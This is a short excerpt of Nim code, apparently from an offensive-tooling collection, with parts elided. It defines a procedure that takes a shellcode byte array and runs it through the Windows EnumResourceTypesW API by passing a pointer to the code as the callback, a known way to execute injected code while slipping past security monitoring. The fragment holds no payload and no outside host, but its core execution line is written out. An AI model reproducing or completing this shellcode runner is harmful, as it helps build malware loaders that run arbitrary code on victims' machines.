...
proc enumResourcesTypesW[byte](shellcode: openArray[byte]): void =
  ...
  EnumResourceTypesW(LoadLibraryW(r"Kernel32.dll"), cast[ENUMRESTYPEPROCW](rPtr), cast[LONG_PTR](NULL))
